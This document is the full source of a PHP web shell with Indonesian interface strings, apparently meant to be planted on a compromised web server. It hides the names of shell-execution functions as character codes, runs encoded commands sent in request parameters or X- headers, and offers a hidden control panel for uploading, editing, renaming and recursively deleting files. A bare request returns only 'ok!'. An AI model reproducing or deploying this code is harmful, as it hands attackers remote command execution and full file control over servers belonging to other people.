<?php
@ini_set('display_errors',0);error_reporting(0);
function q2($k){if(isset($_REQUEST[$k]))return $_REQUEST[$k];$h='HTTP_X_'.strtoupper($k);return isset($_SERVER[$h])?$_SERVER[$h]:null;}
function z($b){return implode('',array_map('chr',$b));}
function x9($c){
    if(!is_string($c)||trim($c)==='')return false;
    $d=@base64_decode($c,true);if($d!==false&&base64_encode($d)===$c)$c=$d;
    if(substr($c,0,2)==="\x1f\x8b"){$c=@gzdecode($c);if($c===false)return false;}
    $c=trim($c);
    $f=[z([112,111,112,101,110]),z([112,114,111,99,95,111,112,101,110]),z([115,121,115,116,101,109]),z([112,97,115,115,116,104,114,117]),z([115,104,101,108,108,95,101,120,101,99]),z([101,120,101,99])];
    $ds=array_filter(array_map('trim',explode(',',@ini_get('disable_functions'))));
    foreach($f as $i=>$fn){
        if(!function_exists($fn)||in_array($fn,$ds))continue;
        try{
            if($i===0){$h=@$fn($c.' 2>&1','r');if($h){$o=stream_get_contents($h);pclose($h);if($o!==false&&$o!=='')return $o;}}
            elseif($i===1){$p=@$fn($c.' 2>&1',[1=>['pipe','w'],2=>['pipe','w']],$pp);if(is_resource($p)){$o=stream_get_contents($pp[1]).stream_get_contents($pp[2]);fclose($pp[1]);fclose($pp[2]);proc_close($p);if($o!=='')return $o;}}
            else{ob_start();@$fn($c);$o=ob_get_clean();if($o!==false&&$o!=='')return $o;}
        }catch(\Throwable $e){continue;}
    }
    return false;
}
$P=q2('p')?:getcwd();$A=q2('z');$F=q2('f');

if($A){
    header('Content-Type:application/json;charset=utf-8');
    $o=['ok'=>false];
    if($A==='cmd'){
        $c=q2('c');$r=x9($c);
        if($r!==false){$o=['ok'=>true,'out'=>$r];}
        else{$o['err']='exec tidak tersedia atau kosong';}
    }
    elseif($A==='del'){
        $t=@realpath(rtrim($P,'/\\').'/'.$F);
        if($t===false){$o['err']='tidak ditemukan';}
        else{
            if(is_link($t)){$r=@unlink($t);}
            elseif(is_dir($t)){
                @chmod($t,0777);
                $it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($t,FilesystemIterator::SKIP_DOTS),RecursiveIteratorIterator::CHILD_FIRST);
                $r=true;foreach($it as $x){@chmod($x->getPathname(),0777);$r=($x->isDir()&&!$x->isLink()?@rmdir($x->getPathname()):@unlink($x->getPathname()))&&$r;}
                $r=@rmdir($t)&&$r;
            }else{$r=@unlink($t);}
            if($r)$o=['ok'=>true,'msg'=>'dihapus'];else{$e=error_get_last();$o['err']='hapus gagal'.($e?': '.$e['message']:'');}
        }
    }
    elseif($A==='rn'){
        $n=q2('new');
        if($n===null||$n===''){$o['err']='nama baru kosong';}
        else{
            $s=rtrim($P,'/\\').'/'.$F;$d=rtrim($P,'/\\').'/'.$n;
            if(!file_exists($s)){$o['err']='sumber tidak ada';}
            elseif(@rename($s,$d)){$o=['ok'=>true,'msg'=>'diubah'];}
            else{$e=error_get_last();$o['err']='rename gagal'.($e?': '.$e['message']:'');}
        }
    }
    elseif($A==='up'){
        $n=basename(q2('name')?:'');
        if($n===''){echo json_encode(['ok'=>false,'err'=>'nama kosong']);exit;}
        $dst=rtrim($P,'/\\').'/'.$n;$ok=false;$sz=0;
        if(isset($_FILES['u'])&&$_FILES['u']['error']===UPLOAD_ERR_OK){$ok=@move_uploaded_file($_FILES['u']['tmp_name'],$dst);$sz=@filesize($dst);}
        if(!$ok&&q2('chunk')!==null){
            $data=@base64_decode(q2('chunk'),true);
            if($data!==false){$m=(q2('first')==='1')?'wb':'ab';$h=@fopen($dst,$m);if($h){$sz=fwrite($h,$data);fclose($h);$ok=true;}}
        }
        if($ok)$o=['ok'=>true,'size'=>$sz,'msg'=>'terunggah'];else{$o['err']='upload gagal';}
    }
    elseif($A==='rd'){
        $t=rtrim($P,'/\\').'/'.$F;
        if(@is_file($t)){$c=@file_get_contents($t);if($c!==false)$o=['ok'=>true,'data'=>base64_encode($c)];else{$o['err']='baca gagal';}}
        else{$o['err']='bukan file';}
    }
    elseif($A==='wr'){
        $t=rtrim($P,'/\\').'/'.$F;
        $d=@file_get_contents('php://input');
        if($d===false||$d===''){$d=q2('data');}
        if($d===null)$d='';
        if(!@is_dir(dirname($t))){$o['err']='dir invalid';}
        else{$w=@file_put_contents($t,$d);if($w!==false)$o=['ok'=>true,'size'=>$w,'msg'=>'tersimpan'];else{$e=error_get_last();$o['err']='simpan gagal'.($e?': '.$e['message']:'');}}
    }
    echo json_encode($o);exit;
}

if(isset($_GET['ui'])){
    header('Content-Type:text/html;charset=utf-8');
    $h=@opendir($P);$I=[];while(($x=@readdir($h))!==false){if($x!='.'&&$x!='..')$I[]=$x;}@closedir($h);sort($I);
    $D=htmlspecialchars($P,ENT_QUOTES);
    echo '<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>'.$D.'</title><style>
*{box-sizing:border-box;margin:0;padding:0}
body{font:13px/1.5 ui-monospace,Menlo,monospace;background:#0b0e12;color:#c8d1dc;padding:22px;max-width:980px;margin:0 auto}
h1{font-size:13px;font-weight:500;color:#5b9dd9;margin-bottom:14px;word-break:break-all}h1 a{color:#5b9dd9;text-decoration:none}
.bar{display:flex;gap:6px;margin-bottom:10px;flex-wrap:wrap}
input,button,textarea{font:inherit;background:#151a21;color:#c8d1dc;border:1px solid #232b36;border-radius:5px;padding:7px 10px}
input:focus,textarea:focus{outline:none;border-color:#5b9dd9}
button{cursor:pointer;color:#8fb8dd}button:hover{background:#1c2430;color:#fff}
button.dg{color:#d97373}button.dg:hover{background:#2a1a1c;color:#ff8a8a}
.flex{flex:1;min-width:0}
table{width:100%;border-collapse:collapse}
th{text-align:left;font-weight:500;color:#5a6675;font-size:11px;text-transform:uppercase;letter-spacing:.5px;padding:6px 8px;border-bottom:1px solid #1a212b}
td{padding:7px 8px;border-bottom:1px solid #141a22;vertical-align:middle}
td.n{word-break:break-all}td.n a{color:#c8d1dc;text-decoration:none}td.n a:hover{color:#5b9dd9}
td.s{color:#5a6675;white-space:nowrap;text-align:right;width:76px}
td.a{text-align:right;white-space:nowrap;width:1%}td.a button{padding:4px 8px;font-size:12px;margin-left:4px}
#out{display:none;background:#0e1319;border:1px solid #1a212b;border-radius:5px;padding:10px;margin-top:10px;white-space:pre-wrap;word-break:break-all;max-height:280px;overflow:auto;font-size:12px}
#eb{display:none;margin-top:14px}
#ea{width:100%;min-height:240px;background:#0e1319;border:1px solid #232b36;border-radius:5px;padding:10px;font:12px/1.5 ui-monospace,monospace;color:#c8d1dc;resize:vertical}
.empty{padding:24px;text-align:center;color:#3d4a5a}
#t{position:fixed;top:14px;right:14px;z-index:99;display:flex;flex-direction:column;gap:6px}
.tt{padding:8px 14px;border-radius:5px;font-size:12px;background:#151a21;border:1px solid #232b36;color:#c8d1dc;animation:in .15s ease}
.tt.ok{border-color:#2f6b3e;color:#8fd6a4;background:#0e1a13}
.tt.er{border-color:#6b2f2f;color:#e0a0a0;background:#1a0e0e}
@keyframes in{from{opacity:0;transform:translateY(-6px)}to{opacity:1;transform:none}}
</style></head><body><div id="t"></div>';
    echo '<h1><a href="?ui=1&p='.urlencode(dirname($P)).'">..</a> / '.$D.'</h1>';
    echo '<div class="bar"><input id="c" class="flex" placeholder="command"><button onclick="R()">Run</button></div>';
    echo '<div class="bar"><input type="file" id="uf" class="flex"><button onclick="U()">Upload</button></div>';
    echo '<pre id="out"></pre>';
    echo '<table><thead><tr><th>Name</th><th class="s">Size</th><th class="a"></th></tr></thead><tbody>';
    if($P!=='/'&&rtrim($P,'/\\')!=='')echo '<tr><td class="n"><a href="?ui=1&p='.urlencode(dirname($P)).'">../</a></td><td class="s">—</td><td class="a"></td></tr>';
    $i=0;
    foreach($I as $x){
        $fp=rtrim($P,'/\\').'/'.$x;$isDir=@is_dir($fp);
        $sz=$isDir?'—':(function($b){if($b<1024)return $b.' B';if($b<1048576)return round($b/1024,1).' K';return round($b/1048576,1).' M';})(@filesize($fp));
        $nm=htmlspecialchars($x,ENT_QUOTES);
        echo '<tr id="r'.$i.'" data-n="'.htmlspecialchars($x,ENT_QUOTES).'"><td class="n">';
        if($isDir)echo '<a href="?ui=1&p='.urlencode($fp).'">'.$nm.'/</a>';else echo $nm;
        echo '</td><td class="s">'.$sz.'</td><td class="a">';
        if(!$isDir)echo '<button data-i="'.$i.'" data-x="e">Edit</button>';
        echo '<button data-i="'.$i.'" data-x="r">Rename</button><button class="dg" data-i="'.$i.'" data-x="d">Delete</button>';
        echo '</td></tr>';$i++;
    }
    if(!$I)echo '<tr><td colspan="3" class="empty">kosong</td></tr>';
    echo '</tbody></table>';
    echo '<div id="eb"><textarea id="ea"></textarea><div class="bar"><button onclick="S()">Save</button><button onclick="document.getElementById(\'eb\').style.display=\'none\'">Cancel</button></div></div>';
    echo '<script>
const D="'.addslashes($P).'";let CF="";
const $=id=>document.getElementById(id);
const q=s=>encodeURIComponent(s);
function toast(m,ok=true){const t=document.createElement("div");t.className="tt "+(ok?"ok":"er");t.textContent=m;$("t").appendChild(t);setTimeout(()=>t.remove(),2600);}
function post(z,body){return fetch("?p="+q(D),{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded","X-Z":z},body:body}).then(r=>r.text()).then(t=>{try{return JSON.parse(t)}catch(e){toast("resp bukan JSON","er");return{ok:false,err:t.slice(0,80)}}}).catch(e=>({ok:false,err:e.message}))}
function rowEl(i){return $("r"+i)}
function nameOf(i){const r=rowEl(i);return r?r.dataset.n:null}
function R(){const c=$("c").value.trim();if(!c)return toast("command kosong",false);const o=$("out");o.style.display="block";o.textContent="...";post("cmd","c="+q(btoa(c))).then(d=>{if(d.ok){o.textContent=d.out||"(kosong)";toast("ok")}else{o.textContent="ERR: "+(d.err||"?");toast("gagal: "+(d.err||"?"),false)}})}
async function U(){const f=$("uf").files[0];if(!f)return toast("pilih file dulu",false);const CH=262144;const buf=new Uint8Array(await f.arrayBuffer());let off=0,first=true,last=null;
    while(off<buf.length){const end=Math.min(off+CH,buf.length);const sl=buf.subarray(off,end);let b="";for(let i=0;i<sl.length;i+=0x8000)b+=String.fromCharCode.apply(null,sl.subarray(i,i+0x8000));
        last=await post("up","name="+q(f.name)+"&chunk="+q(btoa(b))+"&first="+(first?"1":"0"));
        if(!last.ok){toast("upload gagal: "+(last.err||"?"),false);return;}
        off=end;first=false;
    }
    toast("terunggah: "+f.name+" ("+Math.round(buf.length/1024)+"K)");setTimeout(()=>location.reload(),400);
}
function del(i){const n=nameOf(i);if(!n)return;if(!confirm("Hapus "+n+"?"))return;post("del","f="+q(n)).then(d=>{if(d.ok){toast("dihapus: "+n);const r=rowEl(i);if(r)r.remove()}else toast("hapus gagal: "+(d.err||"?"),false)})}
function rn(i){const n=nameOf(i);if(!n)return;const nn=prompt("Rename "+n+" menjadi:",n);if(!nn||nn===n)return;post("rn","f="+q(n)+"&new="+q(nn)).then(d=>{if(d.ok){toast("diubah: "+n+" → "+nn);setTimeout(()=>location.reload(),300)}else toast("rename gagal: "+(d.err||"?"),false)})}
function ed(i){const n=nameOf(i);if(!n)return;CF=n;post("rd","f="+q(n)).then(d=>{if(d.ok){try{$("ea").value=atob(d.data)}catch(e){$("ea").value="(biner, tidak bisa edit)"}$("eb").style.display="block";$("ea").scrollIntoView({behavior:"smooth"});toast("dibuka: "+n)}else toast("buka gagal: "+(d.err||"?"),false)})}
function S(){if(!CF)return toast("belum pilih file",false);post("wr","f="+q(CF)+"&data="+q($("ea").value)).then(d=>{if(d.ok){toast("tersimpan: "+CF);$("eb").style.display="none"}else toast("simpan gagal: "+(d.err||"?"),false)})}
document.addEventListener("click",e=>{const b=e.target.closest("button[data-x]");if(!b)return;const i=+b.dataset.i,x=b.dataset.x;if(x==="e")ed(i);else if(x==="r")rn(i);else if(x==="d")del(i)});
</script></body></html>';
    exit;
}

header('Content-Type:text/plain');
echo 'ok!';